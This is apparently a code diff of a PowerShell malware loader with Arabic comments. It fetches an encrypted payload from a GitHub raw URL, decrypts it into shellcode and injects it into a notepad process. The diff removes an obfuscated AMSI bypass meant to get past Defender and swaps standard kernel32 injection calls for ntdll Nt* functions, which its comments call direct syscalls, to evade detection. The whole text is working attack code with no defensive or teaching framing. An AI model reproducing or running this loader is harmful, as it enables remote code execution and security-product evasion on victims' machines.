@@ -1,3 +1,4 @@
+# تحميل Shellcode وفك التشفير (نفس الكود السابق)
 $url = 'https://raw.githubusercontent.com/Mouted/Hos/main/b64.txt'
 $wc = New-Object System.Net.WebClient
 $b64 = $wc.DownloadString($url).Trim()
@@ -15,40 +16,43 @@ $shellcode = $dec.TransformFinalBlock($enc, 0, $enc.Length)
 $dec.Dispose()
 $aes.Dispose()
 
-# ============================================================
-# AMSI Bypass - Obfuscated (يتجاوز Defender)
-# ============================================================
-$a1 = 'System.Management'
-$a2 = '.Automation.'
-$a3 = 'Amsi'
-$a4 = 'Utils'
-$w = $a1 + $a2 + $a3 + $a4
-$a = [Ref].Assembly.GetType($w)
-
-$f1 = 'amsi'
-$f2 = 'Init'
-$f3 = 'Failed'
-$f = $a.GetField($f1 + $f2 + $f3, 'NonPublic,Static')
-
-$f.SetValue($null, $true)
-
-# ============================================================
-# C# Code - Obfuscated
-# ============================================================
+# ✅ Direct Syscalls (بدون AMSI Bypass)
 $code = @'
 using System;
 using System.Runtime.InteropServices;
-public class W {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(uint a, bool b, int c);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, uint d, out IntPtr e);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out IntPtr g);
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr a);
+
+public class Syscall
+{
+    [DllImport("ntdll.dll")]
+    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint BytesWritten);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr AttributeList);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtClose(IntPtr Handle);
+
+    public struct OBJECT_ATTRIBUTES
+    {
+        public uint Length;
+        public IntPtr RootDirectory;
+        public IntPtr ObjectName;
+        public uint Attributes;
+        public IntPtr SecurityDescriptor;
+        public IntPtr SecurityQualityOfService;
+    }
+
+    public struct CLIENT_ID
+    {
+        public IntPtr UniqueProcess;
+        public IntPtr UniqueThread;
+    }
 }
 '@
 Add-Type -TypeDefinition $code -Language CSharp
@@ -59,13 +63,27 @@ if ($p -eq $null) {
     Start-Sleep 2
     $p = Get-Process notepad | Select-Object -First 1
 }
-$h = [W]::OpenProcess(0x1F0FFF, $false, $p.Id)
-if ($h -eq [IntPtr]::Zero) { exit 2 }
-$m = [W]::VirtualAllocEx($h, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
-if ($m -eq [IntPtr]::Zero) { exit 3 }
-$w = [IntPtr]::Zero
-[W]::WriteProcessMemory($h, $m, $shellcode, $shellcode.Length, [ref]$w)
-$t = [W]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [ref]$w)
-if ($t -eq [IntPtr]::Zero) { exit 4 }
-[W]::CloseHandle($t)
-[W]::CloseHandle($h)
+
+$hProc = [IntPtr]::Zero
+$oa = New-Object Syscall+OBJECT_ATTRIBUTES
+$oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
+$cid = New-Object Syscall+CLIENT_ID
+$cid.UniqueProcess = [IntPtr]$p.Id
+$status = [Syscall]::NtOpenProcess([ref]$hProc, 0x1F0FFF, [ref]$oa, [ref]$cid)
+if ($status -ne 0) { exit 2 }
+
+$addr = [IntPtr]::Zero
+$size = [IntPtr]$shellcode.Length
+$status = [Syscall]::NtAllocateVirtualMemory($hProc, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x40)
+if ($status -ne 0) { exit 3 }
+
+$written = 0
+$status = [Syscall]::NtWriteVirtualMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]$written)
+if ($status -ne 0) { exit 4 }
+
+$hThread = [IntPtr]::Zero
+$status = [Syscall]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $addr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
+if ($status -ne 0) { exit 5 }
+
+[Syscall]::NtClose($hThread)
+[Syscall]::NtClose($hProc)
